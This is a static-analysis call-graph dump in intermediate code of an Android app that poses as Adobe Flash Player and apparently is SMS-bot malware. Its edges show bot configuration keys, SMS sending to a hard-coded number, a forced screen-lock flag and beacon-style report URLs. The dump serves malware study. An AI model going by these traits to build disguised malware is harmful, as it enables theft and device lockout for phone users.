SPECIAL edge: $r7 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $l4 = virtualinvoke r3.<java.io.File: long lastModified()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: long lastModified()>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("*", "S") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.SystemSWF: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.SystemSWF: android.content.Intent getIntent()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<android.content.Intent: java.lang.String getAction()>() in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: java.lang.String getAction()>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean contains(java.lang.CharSequence)>("LOCKED") in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeFlashCore;") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
STATIC edge: $r35 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=in_call&i=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("sendSMS[") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("c", "1234567890", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r41) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "*", $r2) in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r4.<java.lang.String: void <init>(byte[],java.lang.String)>($r15, "UTF-8") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: void <init>(byte[],java.lang.String)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.String: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.String: void <clinit>()>
STATIC edge: $r17 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r17) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z0 = virtualinvoke $r0.<com.adobe.flashplayer.Certificate: boolean onKeyDown(int,android.view.KeyEvent)>(0, null) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: boolean onKeyDown(int,android.view.KeyEvent)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r12) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r15) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r6.<java.lang.String: boolean contains(java.lang.CharSequence)>("de") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("w", "NOFILTER", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: $r1 = specialinvoke $r0.<com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)>($r1, $r2) in <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer.Certificate: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer.Certificate: void onAttachedToWindow()>() in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void onAttachedToWindow()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.AdobeUtil: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeUtil: void <init>()>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.packages.ZLocker: android.view.Window getWindow()>() in <com.adobe.packages.ZLocker: void onAttachedToWindow()> ==> <android.app.Activity: android.view.Window getWindow()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.ADOBEcoreZa dummyMainMethod_com_adobe_flashplayer___ADOBEcoreZa(android.content.Intent)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("keyHttpGate") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r24 = virtualinvoke $r20.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("http://", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>($r1, class "Lcom/adobe/flashplayer/Certificate;") in <com.adobe.flashplayer_.ADOBEcoreZa: java.lang.CharSequence onDisableRequested(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: $r5 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.io.FileInputStream openFileInput(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <android.content.ContextWrapper: java.io.FileInputStream openFileInput(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r5 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotID", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, r19, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r15.<java.lang.StringBuilder: void <init>(java.lang.String)>($r9) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r15 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotNetwork") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forcelock", "LOCKED", $r38) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r25 = virtualinvoke $r21.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r29) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.packages.BK: void setContentView(int)>(2130903044) in <com.adobe.packages.BK: void onCreate(android.os.Bundle)> ==> <android.app.Activity: void setContentView(int)>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "BotNetwork", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
SPECIAL edge: r25 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: staticinvoke <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>($r3, "BotLocation", $r4) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <com.adobe.flashplayer.Certificate: java.lang.String access$0(com.adobe.flashplayer.Certificate,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r2.<com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)>($r1) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate$1: void onClick(android.view.View)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.FlashARM: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashARM: void onActivityResult(int,int,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: android.content.Intent getIntent()>
VIRTUAL edge: $r11 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("MacrosAState", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r34 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.AdobeFlashCore dummyMainMethod_com_adobe_flashplayer___AdobeFlashCore(android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r30 = staticinvoke <android.os.Environment: java.lang.String getExternalStorageState()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.Environment: java.lang.String getExternalStorageState()>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r4 = virtualinvoke $r2.<android.content.Intent: java.lang.String getAction()>() in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: java.lang.String getAction()>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>("79262000900", "HELP") in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
